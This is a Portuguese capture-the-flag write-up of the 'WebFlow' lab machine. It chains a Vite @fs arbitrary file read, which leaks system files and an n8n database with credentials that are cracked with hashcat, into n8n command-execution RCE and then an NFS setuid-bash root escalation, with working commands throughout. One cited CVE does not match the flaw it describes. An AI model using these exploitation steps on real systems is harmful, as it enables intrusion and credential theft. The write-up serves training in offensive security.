# WebFlow

![WebFlow](/images/hackingclub-webflow/file-webflow-2025-1.png)

## Sumário

A máquina começa com uma vulnerabilidade no `Vite`, onde o recurso `@fs` estava exposto e permitia a leitura de qualquer arquivo no servidor. Isso possibilitou a obtenção de informações internas que normalmente não deveriam estar acessíveis. Com esses dados, foi possível avançar para a segunda etapa, explorando o `n8n`, que estava configurado de forma permissiva e permitia a execução de comandos diretamente pelo fluxo de automações, resultando em RCE dentro do ambiente onde o serviço rodava. Após obter acesso inicial, a etapa final envolveu a escalação de privilégios por meio de uma configuração insegura de `NFS`. O compartilhamento exportado permitia montar diretórios virtualmente e manipular permissões e UIDs dos arquivos, o que viabilizou criar arquivos com privilégios elevados e, assim, assumir controle total do sistema.

## Reconhecimento

### Varredura de portas

Utilizou-se nmap para mapear portas e serviços na máquina alvo. O scan identificou quatro portas abertas.

```bash
nmap -Pn -sV -vv webflow.hc
```

**Resultado**

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack nginx 1.24.0 (Ubuntu)
111/tcp  open  rpcbind syn-ack 2-4 (RPC #100000)
2049/tcp open  nfs_acl syn-ack 3 (RPC #100227)
```

> ℹ️ O serviço rpcbind(porta 111) é responsável por mapear serviços RPC para as portas onde realmente estão escutando. No contexto do NFS, ele permite que o cliente descubra dinamicamente as portas usadas por componentes como mountd, nlockmgr e outros serviços auxiliares.
{: .prompt-info}
> ℹ️ A porta 2049 é a porta padrão do servidor NFS (nfsd). É nela que ocorrem as operações de leitura, escrita e gerenciamento dos compartilhamentos exportados.
{: .prompt-info}

### Fuzzing

Enumeração de hosts para encontrar diretórios e arquivos ocultos.

```bash
feroxbuster -u http://webflow.hc -w /path/to/wordlist
```

**Resultado**

![Fuzzing](/images/hackingclub-webflow/file-webflow-2025-2.png)

## Explorando a Vulnerabilidade

Ao explorar o diretório `package`, foi possível identificar que a aplicação utiliza o Vite como ferramenta de build e desenvolvimento. A partir dessa informação, realizou-se uma pesquisa direcionada sobre potenciais vulnerabilidades associadas ao Vite, resultando na identificação da CVE-2025-30208, que descreve uma falha de `arbitrary file read` explorável em determinadas configurações do servidor de desenvolvimento.

> ❌ Arbitrary File Read é uma vulnerabilidade que permite a um atacante ler arquivos arbitrários no servidor — ou seja, qualquer arquivo que o processo da aplicação tenha permissão de acessar. Com essa falha, o atacante pode acessar informações sensíveis, como arquivos de configuração, credenciais, chaves privadas ou código-fonte, comprometendo completamente a segurança da aplicação e, muitas vezes, do próprio servidor.
{: .prompt-danger}

### Referência

- [CVE-2025-30208 – Vite Arbitrary File Read via @fs Path Traversal Bypass](https://www.offsec.com/blog/cve-2025-30208/)

![Vulnerability](/images/hackingclub-webflow/file-webflow-2025-3.png)
![VulnerabilityGoogle](/images/hackingclub-webflow/file-webflow-2025-4.png)

Após compreender a vulnerabilidade, iniciamos a exploração prática. Durante a enumeração inicial, identificamos a presença dos usuários `root` e `appsvc` no servidor. Em seguida, utilizando o arbitrary file read, realizamos a leitura de arquivos sensíveis, como `/etc/hosts`. Nesse arquivo, encontramos a referência ao subdomínio `automation.webflow.hc`, indicando um possível componente adicional da infraestrutura que poderia ser investigado para ampliar a superfície de ataque.

```bash
curl "http://webflow.hc/@fs/etc/passwd?import&raw??"
```

![ExploringVulnerability](/images/hackingclub-webflow/file-webflow-2025-5.png)

```bash
curl "http://webflow.hc/@fs/etc/hosts?import&raw??"
```

![ExploringVulnerability](/images/hackingclub-webflow/file-webflow-2025-6.png)

Ao acessar o subdomínio pelo navegador, fomos apresentados à tela de login do `n8n`, indicando que o serviço de automação estava exposto e potencialmente acessível como parte do ambiente vulnerável.

![N8N](/images/hackingclub-webflow/file-webflow-2025-7.png)

### Dump

Como o acesso ao painel administrativo do n8n exigia credenciais válidas, utilizamos a vulnerabilidade de arbitrary file read para extrair o arquivo `database.sqlite`, localizado no diretório do usuário appsvc, em: `/home/appsvc/.n8n/database.sqlite`. Esse arquivo armazena informações sensíveis do n8n — incluindo credenciais, tokens e configurações — permitindo que obtivéssemos acesso ao painel mesmo sem possuir login previamente.

```bash
curl "http://webflow.hc/@fs/home/appsvc/.n8n/database.sqlite?import&raw??" -o dump.sqlite
```

Com o arquivo salvo localmente, executamos um strings para extrair conteúdo legível do database.sqlite e, em seguida, filtramos os resultados utilizando o domínio `@webflow.hc`. Dessa forma, conseguimos identificar rapidamente possíveis credenciais, e-mails ou outros dados relacionados ao ambiente do n8n.

```bash
cat dump.sqlite | strings | grep "@webflow.hc"
```

![Credentials](/images/hackingclub-webflow/file-webflow-2025-9.png)


**Credenciais de acesso ao painel do n8n**

- **email** : `kilts@webflow.hc`
- **password** : `$2a$10$hAEpt/7PKoq40nNlhmVkyuQF1HDsa.ZdxYSM4eYTk5dOEXedVI6Ua` - `P@ssw0rd`

Utilizando o comando `hashcat --identify`, identificamos que o hash encontrado correspondia ao formato `bcrypt`. Com essa informação, executamos o ataque usando o módulo 3200, que é o modo específico do hashcat para quebrar senhas protegidas com bcrypt.

```bash
hascat -m 3200 hash /path/to/wordlist
```

![Hashcat](/images/hackingclub-webflow/file-webflow-2025-10.png)
![HashcatPassword](/images/hackingclub-webflow/file-webflow-2025-11.png)

## RCE(Remote Code Execution)

Após acessar o painel administrativo com as credenciais recuperadas, realizamos uma pesquisa rápida sobre possíveis falhas conhecidas no n8n. Durante essa análise, identificamos a existência da vulnerabilidade `CVE-2025-57749`, que permite execução remota de comandos por meio do nó `Execute Command`.

![ExecuteCommand](/images/hackingclub-webflow/file-webflow-2025-13.png)

### Referência

- [CVE-2025-57749: n8n symlink traversal vulnerability in "Read/Write File" node allows access to restricted files](https://www.miggo.io/vulnerability-database/cve/CVE-2025-57749)

Com isso, obtemos a shell do servidor e capturamos a primeira flag.

![Shell](/images/hackingclub-webflow/file-webflow-2025-14.png)
![Flag](/images/hackingclub-webflow/file-webflow-2025-15.png)

## Privilege Escalation

Durante a fase inicial do pentest, especificamente na etapa de varredura de portas, identificamos que as portas 111 e 2049 estavam abertas. A partir disso, foi possível investigar quais diretórios estavam exportados pelo serviço NFS, o que poderia contribuir para uma possível escalada de privilégios.
Para essa verificação, utilizamos o seguinte comando:

```bash
showmount -e webflow.hc
```

**Resultado**

```
/tmp *
```

Como a saída exibiu o diretório /tmp* sendo exportado, podemos utilizá-lo para criar arquivos localmente — através do NFS — que serão montados no servidor com permissões efetivas de root. Dessa forma, conseguimos manipular arquivos no diretório exportado de maneira privilegiada, permitindo que o usuário da máquina alvo execute esses arquivos e possua permissão elevada.

1 - Primeiramente, precisamos obter acesso como root.

```bash
sudo su
```

2 - Após obter acesso como root, criamos um diretório para montar o compartilhamento NFS.

```bash
mkdir /mnt/nfs
```
> ⚠️ Não é obrigatório criar o ponto de montagem especificamente dentro de /mnt. Esse diretório é apenas uma convenção utilizada em sistemas Unix-like. Podemos definir qualquer caminho como ponto de montagem, desde que o diretório exista e tenhamos permissões adequadas para utilizá-lo.
{: .prompt-warning}

3 - Montamos o diretório exportado via NFS utilizando o comando:

```bash
mount -t nfs webflow.hc:/tmp /mnt/nfs
```

4 - Acessamos o diretório.

```bash
cd /mnt/nfs
```

5 - Copiamos o binário local /bin/bash para o diretório atual (/mnt/nfs).

```bash
cp /bin/bash .
```

6 - Setamos o bit setuid no arquivo bash. +s faz com que, quando o binário for executado, o processo herde o UID do dono do arquivo em vez do UID do usuário que executou.

```bash
chmod +s bash
```

7 - Usamos o comando abaixo para ver a montagem do arquivo.

```bash
df -h
```

8 - No shell do servidor, acessamos o diretório /tmp e executamos o binário com o bit SUID aplicado.

```bash
./bash -p
```
> ✅ ./bash -p executa o modo preservado (privileged mode) do Bash — e isso é fundamental quando se explora um binário com setuid root. Se você executar um bash com SUID root sem -p, o Bash automaticamente derruba os privilégios para o usuário normal, anulando o exploit. O parâmetro -p (preserved environment) diz ao Bash: “Não abandone privilégios. Preserve UID/GID efetivos.”
{: .prompt-success}

![Privesc](/images/hackingclub-webflow/file-webflow-2025-17.png)
![Root](/images/hackingclub-webflow/file-webflow-2025-18.png)